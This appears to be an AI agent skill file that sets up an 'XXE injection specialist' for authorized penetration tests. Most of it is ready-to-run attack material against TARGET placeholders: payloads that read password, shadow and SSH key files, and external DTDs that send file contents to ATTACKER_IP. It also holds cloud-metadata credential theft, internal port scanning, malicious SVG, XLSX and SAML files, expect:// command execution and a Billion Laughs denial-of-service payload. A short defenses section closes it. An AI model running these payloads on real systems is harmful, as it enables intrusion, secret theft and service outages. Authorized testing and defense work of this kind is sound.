---
id: xxe-specialist
name: xxe-specialist
description: >
  XML External Entity (XXE) injection specialist for authorized penetration tests. Covers
  classic XXE, blind OOB via interactsh, XXE through file:// and http:// protocols, XXE
  in PDF/SVG/XLSX/DOCX parsers, SSRF via XXE, XXE-to-RCE chains, JSON-to-XML conversion
  bypass, and XXE defenses. Triggers on: XXE, XML external entity, XXE injection, blind XXE,
  OOB XXE, XXE SSRF, XXE in PDF, XXE in SVG, XXE in XLSX, DOCTYPE injection, SYSTEM entity.
triggers:
  - XXE
  - XML external entity
  - XXE injection
  - blind XXE
  - OOB XXE
  - XXE SSRF
  - XXE in PDF
  - XXE in SVG
  - XXE in XLSX
  - DOCTYPE injection
  - SYSTEM entity
  - DTD injection
  - entity expansion
---

# XXE Injection Specialist

## Authorization Gate

STOP. Confirm written authorization before any XXE testing. All TARGET references are
placeholders — substitute only in-scope systems. OOB callbacks must use attacker-controlled
infrastructure only.

---

## 1. Understanding XXE

XML External Entity (XXE) injection occurs when an XML parser processes user-supplied XML
that references external resources via DOCTYPE declarations and SYSTEM entities. Impact ranges
from local file read to SSRF, DoS (Billion Laughs), and in some configurations, RCE.

### Attack Classes

| Type | Description | Detection |
|---|---|---|
| Classic in-band | XXE output reflected in response | Simple — see file content in response |
| Error-based | XXE triggers error containing file content | Check error messages |
| Blind OOB | DNS/HTTP callback proves XXE, exfil via OOB | Requires attacker server |
| SSRF via XXE | XXE used to reach internal services | Check HTTP callback from server |
| XXE-in-file | XML parsed inside Office/PDF/SVG uploads | Upload file, check OOB |

---

## 2. Classic In-Band XXE

### 2.1 Basic File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

```bash
# Test with curl — inject via XML body
curl -s -X POST https://TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'

# Common Linux files to read
for f in /etc/passwd /etc/shadow /etc/hosts /proc/self/environ \
          /proc/net/tcp /etc/crontab /etc/ssh/sshd_config \
          /var/www/html/wp-config.php /var/www/html/.env \
          ~/.bash_history ~/.ssh/id_rsa; do
  echo "=== $f ===" 
  curl -s -X POST https://TARGET/api/xml \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://$f\">]><root><data>&xxe;</data></root>"
  echo
done
```

### 2.2 Windows File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root><data>&xxe;</data></root>
```

```bash
# Windows common targets
declare -a winfiles=(
  "C:/Windows/System32/drivers/etc/hosts"
  "C:/inetpub/wwwroot/web.config"
  "C:/Windows/win.ini"
  "C:/Users/Administrator/.ssh/id_rsa"
  "C:/xampp/htdocs/config.php"
)
for f in "${winfiles[@]}"; do
  curl -s -X POST https://TARGET/api/xml \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///$f\">]><root><data>&xxe;</data></root>"
done
```

### 2.3 Attribute-Based Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user id="&xxe;">admin</user>
```

---

## 3. Blind XXE — Out-of-Band (OOB)

### 3.1 DNS Callback Confirmation

```xml
<!-- Confirms XXE even when no output is reflected -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ATTACKER.interactsh.com/xxe-confirm">
]>
<root><data>&xxe;</data></root>
```

```bash
# Setup interactsh for OOB detection
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client  # Note the generated *.interactsh.com subdomain

# Then send payload with that subdomain
COLLAB_URL="$(interactsh-client --dns-only 2>/dev/null | grep -oP '[a-z0-9]+\.interactsh\.com' | head -1)"
curl -s -X POST https://TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://$COLLAB_URL/\">]><root><data>&xxe;</data></root>"

# Burp Collaborator alternative — use BURP_COLLAB_HOST
COLLAB="YOUR_BURP_COLLAB_HOST"
curl -s -X POST https://TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://$COLLAB/blind-test\">]><root><data>&xxe;</data></root>"
```

### 3.2 Blind File Exfiltration via DTD and HTTP

```xml
<!-- Attacker DTD hosted on attacker server -->
<!-- File: https://ATTACKER/malicious.dtd -->

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?data=%file;'>">
%wrap;
%send;
```

```xml
<!-- Payload sent to target — loads external DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd">
  %xxe;
]>
<root><data>trigger</data></root>
```

```bash
# Host the malicious DTD
cat > /var/www/html/malicious.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER_IP:8080/?data=%file;'>">
%wrap;
%send;
EOF

# Simple HTTP server to capture exfiltrated data
python3 -m http.server 8080 | tee -a xxe_exfil.log

# Watch for incoming requests with file content
# Note: file content may be URL-encoded in the query string
```

### 3.3 Blind XXE via Error Messages

```xml
<!-- Force error containing file content -->
<!-- Attacker DTD: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

```bash
# Host error-based DTD
cat > /var/www/html/error.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
DTDEOF

# Payload
curl -s -X POST https://TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/error.dtd">%xxe;]><root>x</root>'
# Error response should contain /etc/passwd content in the path error message
```

---

## 4. XXE via SSRF

### 4.1 Cloud Metadata via XXE

```xml
<!-- AWS IMDSv1 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>

<!-- Then fetch specific credential -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">]>
<root><data>&xxe;</data></root>

<!-- GCP metadata -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
<root><data>&xxe;</data></root>

<!-- Azure IMDS -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]>
<root><data>&xxe;</data></root>
```

### 4.2 Internal Network Scanning via XXE SSRF

```bash
# Probe internal hosts — in-band (if reflected)
for ip in 10.0.0.{1..10} 192.168.1.{1..10} 172.16.0.{1..10}; do
  result=$(curl -s -X POST https://TARGET/api/xml \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://$ip/\">]><root><data>&xxe;</data></root>")
  if echo "$result" | grep -qv "Connection refused\|timed out\|error"; then
    echo "[+] $ip responded"
  fi
done

# Port scanning via XXE SSRF
for port in 22 80 443 3306 5432 6379 8080 8443 27017; do
  curl -s -X POST https://TARGET/api/xml \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:$port/\">]><root><data>&xxe;</data></root>" \
    -m 3 | grep -q "refused\|reset" && echo "Port $port closed" || echo "Port $port OPEN/FILTERED"
done
```

---

## 5. XXE in File Parsers

### 5.1 SVG XXE

```bash
# SVG files are XML — any SVG parser may be vulnerable
cat > xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
EOF

# Upload to any endpoint accepting SVG (avatar, logo, document)
curl -s -X POST https://TARGET/upload \
  -F "file=@xxe.svg;type=image/svg+xml"

# Blind OOB SVG
cat > xxe_oob.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd">
  %xxe;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>Trigger</text>
</svg>
EOF
```

### 5.2 XLSX/DOCX XXE (Office Open XML)

```bash
# XLSX/DOCX are ZIP archives containing XML files
# Inject XXE into [Content_Types].xml or xl/workbook.xml

# Step 1: Create base XLSX
pip install openpyxl
python3 -c "
import openpyxl
wb = openpyxl.Workbook()
ws = wb.active
ws['A1'] = 'test'
wb.save('/tmp/base.xlsx')
"

# Step 2: Inject XXE into xl/workbook.xml
cd /tmp && cp base.xlsx xxe_payload.xlsx
unzip -o xxe_payload.xlsx -d xlsx_dir

# Modify [Content_Types].xml to include external entity
cat > xlsx_dir/\[Content_Types\].xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd">
  %xxe;
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
</Types>
EOF

# Repackage
cd xlsx_dir && zip -r ../xxe_payload.xlsx . && cd ..

# Upload to any XLSX import endpoint
curl -s -X POST https://TARGET/import \
  -F "file=@/tmp/xxe_payload.xlsx"
```

### 5.3 PDF XXE

```bash
# Some PDF generators (LibreOffice, Apache FOP, wkhtmltopdf) process XML/HTML input
# If the app generates PDF from user-controlled XML:

# Apache FOP XXE — inject into XSL-FO document
cat > xxe_fop.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<fo:root xmlns:fo="http://www.w3.org/1999/XSL/Format">
  <fo:layout-master-set>
    <fo:simple-page-master master-name="A4">
      <fo:region-body/>
    </fo:simple-page-master>
  </fo:layout-master-set>
  <fo:page-sequence master-reference="A4">
    <fo:flow flow-name="xsl-region-body">
      <fo:block>&xxe;</fo:block>
    </fo:flow>
  </fo:page-sequence>
</fo:root>
EOF
```

### 5.4 SAML XXE

```bash
# SAML assertions are XML — XXE in SAML responses/requests
# Intercept SAML POST in Burp, decode base64 SAMLResponse, inject XXE

# Decode existing SAMLResponse
echo "BASE64_SAML" | base64 -d | zcat > saml_decoded.xml 2>/dev/null || \
echo "BASE64_SAML" | base64 -d > saml_decoded.xml

# Inject XXE into SAMLResponse
python3 << 'EOF'
import base64, zlib

saml_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/saml.dtd">
  %xxe;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://TARGET</saml:Issuer>
</samlp:Response>'''

# SAML responses can be deflate+base64 encoded
compressed = zlib.compress(saml_xxe.encode())[2:-4]  # raw deflate
encoded = base64.b64encode(compressed).decode()
print(f"SAMLResponse={encoded}")
EOF
```

---

## 6. JSON-to-XML Conversion Bypass

```bash
# Some APIs accept both JSON and XML — switch Content-Type to trigger XML parser

# Normal request:
# POST /api/user HTTP/1.1
# Content-Type: application/json
# {"user":"admin"}

# Switch to XML:
curl -s -X POST https://TARGET/api/user \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'

# Try other content-type variants that may trigger XML parsing:
for ct in "text/xml" "application/xml" "application/xhtml+xml" "application/soap+xml"; do
  echo "=== $ct ==="
  curl -s -X POST https://TARGET/api/user \
    -H "Content-Type: $ct" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
done

# application/x-www-form-urlencoded with XML value
curl -s -X POST https://TARGET/api/parse \
  -d 'data=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

---

## 7. XXE-to-RCE Chain

### 7.1 PHP Expect Wrapper (if loaded)

```xml
<!-- PHP expect:// wrapper allows OS command execution -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>
```

### 7.2 PHP Filter Wrapper — Read PHP Source

```xml
<!-- Read PHP source files (base64 encoded to avoid XML parsing issues) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><data>&xxe;</data></root>
```

```bash
# Decode the base64 response
curl -s -X POST https://TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/wp-config.php">]><root><data>&xxe;</data></root>' | \
  grep -oP '(?<=>)[A-Za-z0-9+/=]{20,}(?=<)' | head -1 | base64 -d
```

### 7.3 XXE + SSRF to Internal Jenkins/Spring/Actuator → RCE

```bash
# XXE SSRF to Jenkins script console (if unauthenticated/default creds)
# Step 1: Read internal service list via XXE SSRF
curl -s -X POST https://TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/api/json">]><root><data>&xxe;</data></root>'

# Step 2: POST to Jenkins script console via XXE
# (XXE allows GET only — but may chain with SSRF-to-redirect on internal)
# Better: use XXE to read Jenkins API token from config files
curl -s -X POST https://TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/jenkins_home/secrets/initialAdminPassword">]><root><data>&xxe;</data></root>'
```

---

## 8. Billion Laughs — DoS via Entity Expansion

```xml
<!-- WARNING: This WILL crash/freeze vulnerable parsers — use only in isolated labs -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

---

## 9. Automated XXE Testing

### 9.1 XXEinjector

```bash
# https://github.com/enjoiz/XXEinjector
git clone https://github.com/enjoiz/XXEinjector
cd XXEinjector

# Basic file enumeration
ruby XXEinjector.rb --host=ATTACKER_IP --path=/etc/ --file=request.txt --oob=http

# HTTPS target
ruby XXEinjector.rb --host=ATTACKER_IP --path=/etc/passwd --file=request.txt \
  --ssl --oob=http --httpport=8080
```

### 9.2 Nuclei XXE Templates

```bash
nuclei -u https://TARGET \
  -t http/vulnerabilities/generic/xxe-injection.yaml \
  -t http/cves/ -tags xxe \
  -o nuclei-xxe.txt

# Also check XML-specific endpoints
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://TARGET/FUZZ \
  -mc 200,201,400,500 \
  -H "Content-Type: application/xml"
```

---

## 10. Finding XXE Entry Points

```bash
# Common XXE entry points to look for:
# 1. Any XML body parameter (SOAP, REST with XML content-type)
# 2. File upload endpoints (SVG, DOCX, XLSX, PDF, XML config)
# 3. Content-Type switching (JSON→XML)
# 4. SAML SSO endpoints (/saml/acs, /saml/sso)
# 5. RSS/Atom feed parsers
# 6. OpenID/OAuth XML responses
# 7. XML-based configuration imports
# 8. API gateways with XML transformation

# Search for XML in traffic — Burp Suite filter:
# Proxy → HTTP History → filter: MIME type "XML" or Content-Type "xml"

# ffuf for XML endpoints
ffuf -w endpoints.txt -u https://TARGET/FUZZ \
  -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>x</test>' \
  -mc 200,201,400,500 -fc 404
```

---

## 11. Defenses (Paired with Each Attack)

| Attack | Detection Signal | Hardening Fix |
|---|---|---|
| Classic in-band | DOCTYPE in XML request body | Disable external entity processing in parser config |
| OOB DNS callback | DNS query to attacker domain from server | Egress firewall rules; parser hardening |
| SSRF via XXE | HTTP requests from server to metadata IP | IMDSv2 (token-required); network segmentation |
| SVG XXE | SVG upload with DOCTYPE | Sanitize SVGs with DOMPurify; use libvips for image conversion |
| XLSX XXE | Office file import triggers OOB | Use safe XML parsers; disable DTD in Apache POI |
| SAML XXE | XXE in SAMLResponse | Use OneLogin/ADFS with hardened XML parsers |
| PHP filter read | php://filter in entity SYSTEM | Disable PHP wrappers in XML context |
| Billion Laughs | CPU spike, process hang | Set entity expansion limits; use defusedxml |

### Parser Hardening Code Examples

```python
# Python — defusedxml (drop-in replacement for xml modules)
import defusedxml.ElementTree as ET
tree = ET.parse('input.xml')  # DTD processing disabled by default

# Java — disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

# PHP — disable entity loading
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET | LIBXML_DTDLOAD ^ LIBXML_DTDLOAD);
libxml_disable_entity_loader(true);  // PHP < 8.0

# .NET — disable DTD
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

---

## Related Skills

- `ssrf-specialist` — extending XXE SSRF to full SSRF exploitation
- `rce-specialist` — XXE-to-RCE escalation chains
- `file-upload-bypass` — XXE via file uploads (SVG, DOCX, XLSX)
- `xss-specialist` — SVG upload XSS (related attack surface)
- `nosql-injection` — complementary injection techniques
